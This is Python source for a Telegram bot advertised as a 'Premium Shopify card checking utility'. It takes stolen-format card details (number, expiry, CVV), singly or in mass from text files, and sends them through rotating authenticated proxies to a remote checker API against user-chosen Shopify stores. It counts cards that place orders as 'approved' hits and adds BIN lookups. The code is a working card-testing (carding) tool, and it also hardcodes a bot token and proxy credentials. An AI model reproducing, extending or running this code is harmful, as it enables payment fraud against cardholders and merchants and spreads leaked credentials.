import asyncio
import httpx
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, CallbackQueryHandler
from telegram.constants import ParseMode, ChatAction
import logging
import os
import time
import html
import random
import io
import traceback
from datetime import datetime

# --- Enhanced Logging Setup ---
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("bot.log", encoding='utf-8')
    ]
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("apscheduler").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)

# --- Configuration ---
TELEGRAM_BOT_TOKEN = "7615802418:AAGKxCpVrDVGFbyd3aQi0_9G9CHGcJMCLEY" # Replace with your actual token
CHECKER_API_URL = "https://sigmabro766.onrender.com/"
BINLIST_API_URL = "https://lookup.binlist.net/"

# --- Restored Proxy List ---
PROXY_LIST = [
    # The following proxy was causing SSL errors and has been disabled.
    # "http://PP_2MX8KKO81J:soyjpcgu_country-us@ps-pro.porterproxies.com:31112",
    "http://In2nyCyUORV4KYeI:yXhbVJozQeBVVRnM@geo.g-w.info:10080",
    *[f"http://{p.split(':')[2]}:{p.split(':')[3]}@{p.split(':')[0]}:{p.split(':')[1]}" for p in [
        "38.154.227.167:5868:dmeigyzw:5ece3v7xz8d2",
        "198.23.239.134:6540:dmeigyzw:5ece3v7xz8d2",
        "207.244.217.165:6712:dmeigyzw:5ece3v7xz8d2",
        "107.172.163.27:6543:dmeigyzw:5ece3v7xz8d2",
        "216.10.27.159:6837:dmeigyzw:5ece3v7xz8d2",
        "142.147.128.93:6593:dmeigyzw:5ece3v7xz8d2",
        "64.64.118.149:6732:dmeigyzw:5ece3v7xz8d2",
        "136.0.207.84:6661:dmeigyzw:5ece3v7xz8d2",
        "206.41.172.74:6634:dmeigyzw:5ece3v7xz8d2",
        "104.239.105.125:6655:dmeigyzw:5ece3v7xz8d2",
    ]]
]

# Removed 'Accept-Encoding' to force plain text responses and prevent parse errors
COMMON_HTTP_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.9",
    "Connection": "keep-alive"
}

# --- User Data Management ---
USER_SITES_FILE = "user_shopify_sites.json"
user_sites_db = {}

def load_user_sites():
    global user_sites_db
    try:
        if os.path.exists(USER_SITES_FILE):
            with open(USER_SITES_FILE, 'r', encoding='utf-8') as f:
                loaded_data = json.load(f)
                for k, v in loaded_data.items():
                    user_id = int(k)
                    if isinstance(v, str): user_sites_db[user_id] = [v]
                    elif isinstance(v, list): user_sites_db[user_id] = v
    except Exception as e:
        logger.error(f"Failed to load user sites: {e}")
        user_sites_db = {}

def save_user_sites():
    try:
        with open(USER_SITES_FILE, 'w', encoding='utf-8') as f:
            json.dump(user_sites_db, f, indent=4, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Failed to save user sites: {e}")

# --- API Helpers ---
def parse_checker_api_response(response_text: str):
    try:
        json_start = response_text.find('{')
        json_end = response_text.rfind('}')
        if json_start == -1 or json_end == -1: return None
        return json.loads(response_text[json_start:json_end+1])
    except Exception as e:
        logger.error(f"Failed to parse API response: {e}")
        return None

async def get_bin_details(bin_number):
    def create_error(message):
        base = {"bin": bin_number, "scheme": "N/A", "type": "N/A", "brand": "N/A", "bank_name": "N/A", "country_name": "N/A", "country_emoji": "🌐"}
        base["error"] = message
        return base

    if not bin_number or len(bin_number) < 6: return create_error("Invalid BIN")

    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
    proxies = proxy if proxy else None
    proxy_host = proxy.split('@')[-1].split(':')[0] if proxy else "Direct"

    try:
        headers = {'Accept-Version': '3', **COMMON_HTTP_HEADERS}
        async with httpx.AsyncClient(proxies=proxies, timeout=15.0) as client:
            response = await client.get(f"{BINLIST_API_URL}{bin_number}", headers=headers)

        if response.status_code == 200:
            decoded_content = response.text
            if not decoded_content.strip(): return create_error("Blocked/Empty Response")
            return response.json()
        else:
             return create_error(f"API Error {response.status_code}")
    except Exception as e:
        logger.error(f"BIN lookup failed for {bin_number} via {proxy_host}: {e}")
        return create_error("Lookup Client Error")

# --- Message Templates ---
def generate_header(title):
    return f"<b>┌──────────────────────────────┐</b>\n<b>│  🚀 {title.upper()}  │</b>\n<b>└──────────────────────────────┘</b>\n"

def generate_footer(user, time_taken=None, proxy=None):
    footer = f"\n<b>┌──────────────────────────────┐</b>\n"
    footer += f"<b>│  👤 User:</b> {html.escape(user.first_name)}\n"
    if time_taken: footer += f"<b>│  ⏱ Time:</b> {time_taken}s\n"
    if proxy: footer += f"<b>│  🌐 Proxy:</b> {proxy}\n"
    footer += f"<b>│  🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</b>\n"
    footer += f"<b>└──────────────────────────────┘</b>"
    return footer

# --- Bot Commands ---
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    welcome_msg = generate_header("auto shopify checker") + f"<b>🔹 Welcome, {html.escape(user.first_name)}!</b>\n\n<i>Premium Shopify card checking utility.</i>\n\n<b>💎 Features:</b>\n├ Real-time checking\n├ BIN lookup\n├ Mass checker with site rotation\n└ Multi-site & Proxy support\n\n<b>Choose an option below to get started:</b>"
    keyboard = [[InlineKeyboardButton("➕ Add Target Site", callback_data="site:prompt_add")], [InlineKeyboardButton("📊 Check Single Card", callback_data="nav:single_check"), InlineKeyboardButton("📁 Mass Check", callback_data="nav:mass_check")], [InlineKeyboardButton("📋 Commands", callback_data="nav:show_cmds"), InlineKeyboardButton("👨‍💻 Developer", url="https://t.me/alanjocc")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    if update.callback_query: await update.callback_query.message.edit_text(welcome_msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)
    else: await update.message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode=ParseMode.HTML)

async def cmds_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    commands_msg = generate_header("command list") + "<b>🔹 GENERAL</b>\n├ /start - Show main menu\n└ /cmds - Show this command list\n\n<b>🔹 SITE MANAGEMENT</b>\n├ /add <code>&lt;url&gt;</code> - Add a target site\n├ /listsites - Show your saved sites\n└ /removesite <code>&lt;url&gt;</code> - Remove a site\n\n<b>🔹 CHECKING</b>\n├ /chk <code>N|M|Y|C</code> - Check a single card\n└ /mchk - Mass check (reply to .txt)\n\n<b>🔹 UTILITY</b>\n└ /bin <code>123456</code> - BIN lookup"
    await update.effective_message.reply_text(commands_msg, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Main Menu", callback_data="nav:show_start")]]), parse_mode=ParseMode.HTML)

async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args: return await update.message.reply_text("<b>Usage:</b> <code>/add https://your-site.com</code>", parse_mode=ParseMode.HTML)
    site_url = context.args[0].strip()
    if not site_url.startswith(('http://', 'https://')): site_url = f"https://{site_url}"
    user_sites = user_sites_db.get(user_id, [])
    if site_url in user_sites: return await update.message.reply_text("⚠️ This site is already in your list.", parse_mode=ParseMode.HTML)
    user_sites.append(site_url)
    user_sites_db[user_id] = user_sites
    save_user_sites()
    await update.message.reply_text(f"✅ Site added successfully:\n<code>{html.escape(site_url)}</code>", parse_mode=ParseMode.HTML)

async def listsites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_sites = user_sites_db.get(user_id, [])
    if not user_sites: return await update.message.reply_text("⚠️ No sites found. Use <code>/add &lt;url&gt;</code> to add one.", parse_mode=ParseMode.HTML)
    message = generate_header("your saved sites") + "\n".join([f"<b>{i}.</b> <code>{html.escape(s)}</code>" for i, s in enumerate(user_sites, 1)]) + "\n\nUse <code>/removesite &lt;url&gt;</code> to remove one."
    await update.message.reply_text(message, parse_mode=ParseMode.HTML)

async def removesite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not context.args: return await update.message.reply_text("<b>Usage:</b> <code>/removesite https://your-site.com</code>", parse_mode=ParseMode.HTML)
    site_to_remove = context.args[0].strip()
    user_sites = user_sites_db.get(user_id, [])
    try: user_sites.remove(site_to_remove)
    except ValueError:
        try: user_sites.remove(f"https://{site_to_remove}")
        except ValueError: return await update.message.reply_text("⚠️ Site not found in your list.", parse_mode=ParseMode.HTML)
    user_sites_db[user_id] = user_sites
    save_user_sites()
    await update.message.reply_text("✅ Site removed successfully.", parse_mode=ParseMode.HTML)

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_sites = user_sites_db.get(user_id, [])
    if not user_sites: return await update.message.reply_text("⚠️ No sites set. Use <code>/add &lt;url&gt;</code> first.", parse_mode=ParseMode.HTML)
    if not context.args or context.args[0].count('|') != 3: return await update.message.reply_text("<b>Usage:</b> <code>/chk N|M|Y|C</code>", parse_mode=ParseMode.HTML)

    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    start_time = time.time()
    cc_details_full = context.args[0]
    bin_data_task = asyncio.create_task(get_bin_details(cc_details_full.split('|')[0][:6]))
    
    proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
    proxies = proxy if proxy else None
    proxy_host = proxy.split('@')[-1].split(':')[0] if proxy else "Direct"
    params = {"site": user_sites[0], "cc": cc_details_full}

    try:
        async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, proxies=proxies, timeout=45.0) as client:
            response = await client.get(CHECKER_API_URL, params=params)
        api_data = parse_checker_api_response(response.text)
        if api_data:
            api_response_text = api_data.get("Response", "Unknown")
            if "DECLINED" in api_response_text.upper(): status_emoji, status_text = "❌", "DECLINED"
            elif "Thank You" in api_response_text or "ORDER_PLACED" in api_response_text.upper(): status_emoji, status_text = "✅", "APPROVED"
            else: status_emoji, status_text = "⚠️", "UNKNOWN"
            gateway, price, response_display = api_data.get("Gateway", "N/A"), api_data.get("Price", "0.00"), api_response_text
        else:
            status_emoji, status_text = "❓", "PARSE ERROR"
            gateway, price, response_display = "N/A", "N/A", response.text[:100].strip()
    except Exception as e:
        status_emoji, status_text = "💥", "ERROR"
        gateway, price, response_display = "N/A", "N/A", str(e)
        logger.error(f"Error in chk_command: {e}")

    time_taken = round(time.time() - start_time, 2)
    b = await bin_data_task
    bin_info_str = " / ".join(filter(None, [b.get('scheme'), b.get('type'), b.get('brand')])) or "N/A"
    result_message = generate_header("check result") + f"""
<b>🛡 Status:</b> {status_emoji} <b>{status_text}</b>
<b>💳 Card:</b> <code>{html.escape(cc_details_full)}</code>
<b>💰 Amount:</b> <code>{price}</code>
<b>🚪 Gateway:</b> <code>{gateway}</code>
<b>🎯 Site Used:</b> <code>{html.escape(user_sites[0])}</code>

<b>🔹 BIN Information:</b>
├ <b>BIN:</b> <code>{b.get('bin', 'N/A')}</code>
├ <b>Type:</b> <code>{bin_info_str}</code>
├ <b>Bank:</b> <code>{b.get('bank_name', 'N/A')}</code>
└ <b>Country:</b> {b.get('country_emoji', '🌐')} <code>{b.get('country_name', 'N/A')}</code>
"""
    if b.get("error"): result_message += f"\n<b>BIN Error:</b> <code>{b['error']}</code>"
    result_message += f"\n\n<b>🔹 Response:</b>\n<code>{html.escape(response_display[:400])}</code>" + generate_footer(update.effective_user, time_taken, proxy_host)
    await update.message.reply_text(result_message, parse_mode=ParseMode.HTML)

async def mchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_sites = user_sites_db.get(user_id, [])
    if not user_sites: return await update.message.reply_text("⚠️ No sites set. Use <code>/add &lt;url&gt;</code> first.", parse_mode=ParseMode.HTML)
    if not update.message.reply_to_message or not update.message.reply_to_message.document: return await update.message.reply_text("⚠️ Please reply to a .txt file containing cards.", parse_mode=ParseMode.HTML)

    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    try:
        file = await update.message.reply_to_message.document.get_file()
        cards = [line.strip() for line in (await file.download_as_bytearray()).decode('utf-8').split('\n') if line.strip()]
        if not cards: return await update.message.reply_text("⚠️ No valid cards found in the file.", parse_mode=ParseMode.HTML)

        total_cards, site_count, site_index, start_time = len(cards), len(user_sites), 0, time.time()
        sites_list_str = "\n".join([f"├ <code>{html.escape(s)}</code>" for s in user_sites])
        await update.message.reply_text(generate_header("mass check") + f"🔹 Processing <code>{total_cards}</code> cards...\n🔹 Rotating between <code>{site_count}</code> site(s):\n{sites_list_str}\n└ <b>Started:</b> {datetime.now().strftime('%H:%M:%S')}", parse_mode=ParseMode.HTML)

        results = []; approved, declined, errors = 0, 0, 0
        for i, card in enumerate(cards):
            if i > 0 and i % 10 == 0: site_index = (site_index + 1) % site_count
            if card.count('|') != 3:
                results.append(f"{card} -> INVALID FORMAT"); errors += 1; continue
            try:
                proxy = random.choice(PROXY_LIST) if PROXY_LIST else None
                proxies = proxy if proxy else None
                params = {"site": user_sites[site_index], "cc": card}
                async with httpx.AsyncClient(headers=COMMON_HTTP_HEADERS, proxies=proxies, timeout=30.0) as client:
                    response = await client.get(CHECKER_API_URL, params=params)
                api_data = parse_checker_api_response(response.text)
                if api_data:
                    api_response_text = api_data.get("Response", "Unknown")
                    if "DECLINED" in api_response_text.upper(): status, declined = "DECLINED", declined + 1
                    elif "Thank You" in api_response_text or "ORDER_PLACED" in api_response_text.upper(): status, approved = "APPROVED", approved + 1
                    else: status, errors = "UNKNOWN", errors + 1
                    results.append(f"{card} -> {status} | {api_data.get('Gateway', 'N/A')} | {api_data.get('Price', '0.00')}")
                else: results.append(f"{card} -> PARSE ERROR"); errors += 1
            except Exception as e: results.append(f"{card} -> ERROR: {str(e)}"); errors += 1; logger.error(f"Error processing card {card}: {e}")

        time_taken = round(time.time() - start_time, 2)
        result_content, result_filename = "\n".join(results), f"Results_{approved}Hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with io.BytesIO(result_content.encode('utf-8')) as result_file:
            result_file.name = result_filename
            await update.message.reply_document(document=result_file, caption=generate_header("mass check results") + f"🔹 <b>Total Cards:</b> <code>{total_cards}</code>\n├ <b>✅ Approved:</b> <code>{approved}</code>\n├ <b>❌ Declined:</b> <code>{declined}</code>\n└ <b>⚠️ Errors:</b> <code>{errors}</code>\n\n<b>⏱ Time Taken:</b> <code>{time_taken}s</code>" + generate_footer(update.effective_user), parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Mass check error: {e}"); await update.message.reply_text(f"⚠️ An error occurred during mass check:\n<code>{html.escape(str(e))}</code>", parse_mode=ParseMode.HTML)

async def bin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args or len(context.args[0]) < 6: return await update.message.reply_text("<b>Usage:</b> <code>/bin 123456</code>", parse_mode=ParseMode.HTML)
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action=ChatAction.TYPING)
    bin_data = await get_bin_details(context.args[0][:6])
    proxy_host = "Direct" # Since we don't know which proxy was used inside get_bin_details, we simplify here
    result_message = generate_header("bin information") + f"<b>🔹 BIN:</b> <code>{bin_data.get('bin', 'N/A')}</code>\n<b>🔹 Scheme:</b> <code>{bin_data.get('scheme', 'N/A')}</code>\n<b>🔹 Type:</b> <code>{bin_data.get('type', 'N/A')}</code>\n<b>🔹 Brand:</b> <code>{bin_data.get('brand', 'N/A')}</code>\n<b>🏦 Bank:</b> <code>{bin_data.get('bank_name', 'N/A')}</code>\n<b>🌍 Country:</b> {bin_data.get('country_emoji', '🌐')} <code>{bin_data.get('country_name', 'N/A')}</code>"
    if bin_data.get("error"): result_message += f"\n\n<b>⚠️ Error:</b> <code>{bin_data['error']}</code>"
    result_message += generate_footer(update.effective_user) # Proxy info is not passed as it's internal to the function
    await update.message.reply_text(result_message, parse_mode=ParseMode.HTML)

# --- Main Setup ---
async def button_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query; await query.answer()
    if query.data == "nav:show_start": await start_command(update, context)
    elif query.data == "nav:show_cmds": await cmds_command(update, context)
    elif query.data == "site:prompt_add": await query.message.reply_text("Use the command: <code>/add https://your-site.com</code>", parse_mode=ParseMode.HTML)
    elif query.data == "nav:single_check": await query.message.reply_text("Use the command: <code>/chk N|M|Y|C</code>", parse_mode=ParseMode.HTML)
    elif query.data == "nav:mass_check": await query.message.reply_text("Reply to a .txt file with the command: <code>/mchk</code>", parse_mode=ParseMode.HTML)

async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Exception while handling an update:", exc_info=context.error)
    if update and isinstance(update, Update): await update.effective_message.reply_text("⚠️ An unexpected error occurred. The developer has been notified.", parse_mode=ParseMode.HTML)

def main():
    if not TELEGRAM_BOT_TOKEN or "YOUR_TOKEN" in TELEGRAM_BOT_TOKEN:
        logger.critical("Telegram Bot Token is missing!"); return
    logger.info("Starting bot..."); load_user_sites()
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("cmds", cmds_command))
    application.add_handler(CommandHandler("add", add_command))
    application.add_handler(CommandHandler("listsites", listsites_command))
    application.add_handler(CommandHandler("removesite", removesite_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", mchk_command))
    application.add_handler(CommandHandler("bin", bin_command))
    application.add_handler(CallbackQueryHandler(button_callback_handler))
    application.add_error_handler(error_handler)
    logger.info("Bot is now running..."); application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
